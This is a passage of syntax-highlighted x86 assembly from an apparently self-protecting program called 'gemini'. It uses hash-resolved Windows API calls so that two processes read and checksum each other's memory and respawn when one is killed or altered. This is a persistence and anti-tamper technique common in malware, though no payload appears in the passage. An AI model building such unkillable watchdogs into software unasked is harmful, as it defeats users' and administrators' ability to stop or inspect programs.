        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hexdwd2asc</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGetTickCount</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_event</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;CloseHandle</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_event</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;init continue flag</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;CloseHandle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">TIMEOUT</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">                  </span><span class="sc1">;WaitForSingleObject</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;WaitForSingleObject</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">processinfo</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">startupinfo</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGetStartupInfoA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kCreateProcessA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">startupinfo</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">processinfo.pidwProcessId</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cWaitForSingleObject</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">setz</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;store continue flag</span><span class="sc0">

</span><span class="sc5">restart</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cCloseHandle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cCloseHandle</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">branch_cmd</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_cmdline</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">;remote PID</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">skip_argv1</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">find_argv2</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">;argv2</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">;argv3</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">skip_pid</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">asc2hex</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">;swap event order for remote process</span><span class="sc0">

</span><span class="sc5">skip_pid</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PROCESS_VM_READ</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kOpenProcess</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">branch_cmd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;clear continue flag</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;CloseHandle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EVENT_MODIFY_STATE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">SYNCHRONIZE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cOpenEventA</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;event1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cOpenEventA</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;event2</span><span class="sc0">

        </span><span class="sc1">;sing with me just for today</span><span class="sc0">
        </span><span class="sc1">;maybe tomorrow the good Lord will take you away</span><span class="sc0">

</span><span class="sc5">main_loop</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cWaitForSingleObject</span><span class="sc0">            </span><span class="sc1">;ensure local event reset by remote process</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">shutdown</span><span class="sc0">                        </span><span class="sc1">;still signalled</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kResetEvent</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">

        </span><span class="sc1">;local process checksums remote process</span><span class="sc0">
        </span><span class="sc1">;remote process checksums local process</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">enter</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">401000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kReadProcessMemory</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">shutdown</span><span class="sc0">                        </span><span class="sc1">;read failure</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">check_sum</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">check_sum</span><span class="sc0">
        </span><span class="sc6">leave</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">shutdown</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kSetEvent</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SLEEPLEN</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cSleep</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">TIMEOUT</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cWaitForSingleObject</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">main_loop</span><span class="sc0">                       </span><span class="sc1">;signalled in time</span><span class="sc0">

        </span><span class="sc1">;if one process is killed, then one more process will start</span><span class="sc0">
        </span><span class="sc1">;if one process is altered, then two more processes will start!</span><span class="sc0">
        </span><span class="sc1">;like the Sorceror's Apprentice ;)</span><span class="sc0">

</span><span class="sc5">shutdown</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cCloseHandle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restart</span><span class="sc0">

</span><span class="sc5">skip_spaces</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skip_spaces</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">skip_spaces</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">asc2hex</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">asc2hex_loop</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">asc2hex_ret</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">asc2hex_add</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">asc2hex_add</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">asc2hex_loop</span><span class="sc0">

</span><span class="sc5">asc2hex_ret</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">asc2hex</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">create_event</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;CreateEventA</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hexdwd2asc</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;non-zero</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kCreateEventA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">hexdwd2asc</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hexwrd2asc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hexwrd2asc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hexwrd2asc</span><span class="sc0">

